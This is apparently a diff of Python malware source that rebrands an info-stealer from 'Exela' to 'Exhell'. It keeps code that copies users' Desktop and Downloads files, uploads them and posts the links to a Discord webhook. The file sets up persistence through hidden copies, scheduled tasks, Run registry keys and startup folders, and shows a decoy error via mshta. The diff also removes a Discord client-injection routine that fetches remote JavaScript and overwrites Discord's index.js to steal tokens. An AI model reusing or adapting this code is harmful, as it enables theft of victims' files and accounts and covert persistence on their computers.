                         "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
@@ -1936,81 +1931,7 @@ class UploadGoFile:
         except Exception as e:
             print(f"An error occurred during file upload: '{e}'")
             return None
-
-
-class DiscordInjection:
-    def __init__(self) -> None:
-        self.tokens = Variables.ValidatedTokens # stolen discord tokens for logout discord accounts
-        self.already_killed = False
-        self.LocalAppData = os.getenv("localappdata")
-    async def InjectIntoToDiscord(self) -> None:
-        try:
-            if discord_injection:
-                print("[+] Starting discord injection")
-                discord_dirs = {
-                        "Discord" : os.path.join(self.LocalAppData, "discord"),
-                        "Discord Canary" : os.path.join(self.LocalAppData, "discordcanary"),
-                        "Lightcord" : os.path.join(self.LocalAppData, "Lightcord"),
-                        "Discord PTB" : os.path.join(self.LocalAppData, "discordptb"),
-                    }
-                injection_code = await self.GetInjectionCode()
-                for f, file_paths in discord_dirs.items():
-                    if os.path.exists(file_paths):
-                        indexPath = await self.FindIndexPath(file_paths)
-                        with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
-                            if not webhook in file.read():
-                                if not self.already_killed:
-                                    await self.KillDiscord()
-                                with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
-                                    x.write(injection_code.replace("%WEBHOOK%",webhook))
-                                command = os.path.join(file_paths, "Update.exe") + " --processStart Discord.exe"
-                                result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
-                                await result.communicate()
-                print("[+] Discord Injection was executed successfuly")  
-        except Exception as error:
-            print(f"[-] An error occured while injection to discord, error code => \"{error}\"")
-
-    async def GetInjectionCode(self) -> str:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get("https://raw.githubusercontent.com/justforExela/injection/main/injection.js") as response:
-                    data = await response.text()
-                    return data.replace("%WEBHOOK%", webhook)
-        except Exception as error:
-            print(f"[-] An error occured while getting injection code, error code => \"{error}\"")
-            return None
-
-    async def KillDiscord(self) -> None:
-        try:
-            proc = await asyncio.create_subprocess_shell("tasklist | findstr /i discord", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
-            stdout, stderr = await proc.communicate()
-            processes = stdout.decode(errors="ignore").split('\n')
-            for proc in processes:
-                if 'discord' in proc.lower():
-                    try:
-                        pid = int(proc.split()[1])
-                        kill_proc = await asyncio.create_subprocess_shell(f"taskkill /F /PID {pid}", shell=True,stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-                        await kill_proc.communicate()
-                        self.already_killed = True
-                    except:
-                        pass
-        except:
-            pass
-
-    async def FindIndexPath(self, path:str) -> str:
-        try:
-            for file in os.listdir(path):
-                if re.search(r'app-+?', file):
-                    modules_dir = os.path.join(path, file, "modules")
-                    for modules_files in os.listdir(modules_dir):
-                        if re.search(r'discord_desktop_core-+?', modules_files):
-                            core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
-                            index_path = os.path.join(core_path, "index.js")
-                            if os.path.isfile(index_path):
-                                return index_path
-        except:
-            return None
-
+            
 
 class StealCommonFiles:
     def __init__(self) -> None:
@@ -2028,7 +1949,7 @@ class StealCommonFiles:
                 ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
             )
 
-            destination_directory = os.path.join(self.temp, "StealedFilesByExela")
+            destination_directory = os.path.join(self.temp, "StealedFilesByExhell")
 
             if not os.path.exists(destination_directory):
                 os.makedirs(destination_directory)
@@ -2066,16 +1987,16 @@ class StealCommonFiles:
             if not uploaded_url == None:
                 async with aiohttp.ClientSession() as session:
                     embed_data2 = {
-                            "title": "***Exela Stealer***",
+                            "title": "***Exhell Stealer***",
                             "description": f"***Stealed Files***",
-                            "url" : "https://t.me/ExelaStealer",
+                            "url" : "https://t.me/ExhellStealer",
                             "color": 0,
-                            "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
+                            "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
                             "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
                     fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                                "username": "Exela Stealer",
+                                "username": "Exhell Stealer",
                                 "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
@@ -2094,7 +2015,7 @@ class Startup:
         self.RoamingAppData = os.getenv("APPDATA")
         self.CurrentFile = os.path.abspath(sys.argv[0])
         self.Privalage:bool = SubModules.IsAdmin()
-        self.ToPath:str = os.path.join(self.LocalAppData, "ExelaUpdateService", "Exela.exe")
+        self.ToPath:str = os.path.join(self.LocalAppData, "ExhellUpdateService", "Exhell.exe")
     async def main(self) -> None:
         await self.CreatePathAndMelt()
         print("[+] Started startup injection.")
@@ -2111,7 +2032,7 @@ class Startup:
             if os.path.exists(self.ToPath): # if the startup file already exist, return
                 return
             else:
-                os.mkdir(self.ToPath.replace("Exela.exe", "")) # Create Directory
+                os.mkdir(self.ToPath.replace("Exhell.exe", "")) # Create Directory
                 shutil.copyfile(self.CurrentFile, self.ToPath) # copy to current file to local appdata directory
                 process = await asyncio.create_subprocess_shell(
                 f'attrib +h +s "{self.ToPath}"',
@@ -2124,7 +2045,7 @@ class Startup:
     async def SchtaskStartup(self) -> None: # schtask method for startup
         try:
             command = await asyncio.create_subprocess_shell(
-                'schtasks /query /TN "ExelaUpdateService"',
+                'schtasks /query /TN "ExhellUpdateService"',
                 shell=True,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE)
@@ -2132,8 +2053,8 @@ class Startup:
             if not stdout: # if the file not on schtasks
                 if self.Privalage: # if the code running on admin privilage, execute the startup command
                     try:
-                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "ExelaUpdateService" /tr "{self.ToPath}"'
-                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "ExelaUpdateService2" /tr "{self.ToPath}"'
+                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "ExhellUpdateService" /tr "{self.ToPath}"'
+                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "ExhellUpdateService2" /tr "{self.ToPath}"'
                         process = await asyncio.create_subprocess_shell(onLogonCommand, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                         await process.communicate()
                         process2 = await asyncio.create_subprocess_shell(everyOneHour, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
@@ -2146,12 +2067,12 @@ class Startup:
                         os._exit(0)
                     else: # if the user not give the admin req
                         try:
-                            command = f'schtasks /create /f /sc daily /ri 30 /tn "ExelaUpdateService" /tr "{self.ToPath}"'
+                            command = f'schtasks /create /f /sc daily /ri 30 /tn "ExhellUpdateService" /tr "{self.ToPath}"'
                             process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
                             await process.communicate()
                         except:
                             process = await asyncio.create_subprocess_shell(
-                            f'schtasks /create /f /tn "ExelaUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
+                            f'schtasks /create /f /tn "ExhellUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                             stdout=asyncio.subprocess.PIPE,
                             stderr=asyncio.subprocess.PIPE,
                             shell=True)
@@ -2162,14 +2083,14 @@ class Startup:
         try:
             if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                 process = await asyncio.create_subprocess_shell(
-                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Exela Update Service" /t REG_SZ /d "{self.ToPath}" /f',
+                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Exhell Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
                 shell=True)
                 await process.communicate()
             else: # if the code running admin privilage, copy to HKLM
                 process = await asyncio.create_subprocess_shell(
-                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Exela Update Service" /t REG_SZ /d "{self.ToPath}" /f',
+                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Exhell Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
                 shell=True)
@@ -2179,15 +2100,15 @@ class Startup:
     async def FolderStartup(self): # folder method for startup
         try:
             if self.Privalage: #if the code running admin privilage, copy to common startup path
-                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exela.exe"):
+                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exhell.exe"):
                     print("[+] File already on startup!")
                 else:
-                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exela.exe")
+                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exhell.exe")
             else: #if the code not running admin privilage, copy to normal startup path
-                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exela.exe")):
+                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exhell.exe")):
                     print("[+] File already on startup!")
                 else:
-                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exela.exe"))
+                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Exhell.exe"))
         except Exception as e:
             print(str(e))
 
@@ -2376,7 +2297,7 @@ class AntiVM:
 
 async def Fakerror() -> None:
     try:
-        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "ExelaUpdateService", "Exela.exe"):
+        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "ExhellUpdateService", "Exhell.exe"):
             title = FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the title of the fake error
             message = FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the message of the fake error
             cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, FakeError[1][2])
@@ -2385,7 +2306,7 @@ async def Fakerror() -> None:
 
 if __name__ == '__main__':
     if os.name == "nt":
-        if not SubModules.create_mutex("Exela | Stealar | on top |"):
+        if not SubModules.create_mutex("Exhell | Stealar | on top |"):
             print("mutex already exist")
             os._exit(0)
         else:
@@ -2398,12 +2319,11 @@ if __name__ == '__main__':
             asyncio.run(Fakerror())
             main_instance = Main()
             asyncio.run(main_instance.FunctionRunner())
-            asyncio.run(DiscordInjection().InjectIntoToDiscord())
             if StealFiles == True:
                 asyncio.run(StealCommonFiles().StealFiles())
             print(f"\nThe code executed on: {str(time.time() - start_time)} second", end="")
     else:
-        print("just Windows Operating system's supported by Exela")
+        print("just Windows Operating system's supported by Exhell")
 
 
 
